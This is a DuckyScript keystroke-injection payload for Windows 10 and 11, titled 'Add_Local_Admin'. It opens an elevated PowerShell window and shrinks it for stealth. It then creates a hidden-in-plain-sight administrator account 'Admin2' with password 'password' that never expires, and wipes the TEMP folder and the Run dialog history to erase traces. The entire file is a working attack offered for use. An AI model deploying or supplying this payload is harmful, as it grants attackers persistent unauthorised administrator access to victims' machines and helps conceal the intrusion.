REM Title: Add_Local_Admin
REM Author: LulzAnarchyAnon
REM Description: Administrator PowerShell is opened, and resized for a more stealthy payload delivery, then the payload
REM creates a local admin account on the target system, afterwards powershell exits, and all history is cleared.
REM Target: Windows 10 and 11  
REM Props: Darren Kitchen, and I am Jakoby
REM Version: 3.0
REM Category: Execution

DELAY 500
GUI r
DELAY 500
STRINGLN powershell -Command "Start-Process PowerShell -Verb RunAs"  
DELAY 500
ALT y
DELAY 1000
STRINGLN PowerShell.exe -noe -c ". mode.com con: lines=5 cols=12"
DELAY 1000
STRINGLN $Username = "Admin2"
DELAY 1000
STRINGLN $Password = "password"
DELAY 1000
STRINGLN $group = "Administrators"
DELAY 1000
STRINGLN $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
DELAY 1000
STRINGLN $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
DELAY 1000
STRINGLN if ($existing -eq $null) {
DELAY 1000
STRINGLN Write-Host "Creating new local user $Username."
DELAY 1000
STRINGLN & NET USER $Username $Password /add /y /expires:never
DELAY 1000  
STRINGLN Write-Host "Adding local user $Username to $group."
DELAY 1000
STRINGLN & NET LOCALGROUP $group $Username /add
DELAY 1000
STRINGLN }
DELAY 1000
STRINGLN      {
DELAY 1000
STRINGLN Write-Host "Setting password for existing local user $Username."
DELAY 1000
STRINGLN $existing.SetPassword($Password)
DELAY 1000
STRINGLN }
DELAY 1000
STRINGLN Write-Host "Ensuring password for $Username never expires."
DELAY 1000
STRINGLN & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
DELAY 1000
STRINGLN rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
DELAY 500
STRINGLN reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
DELAY 500
STRINGLN exit
DELAY 200
STRINGLN exit
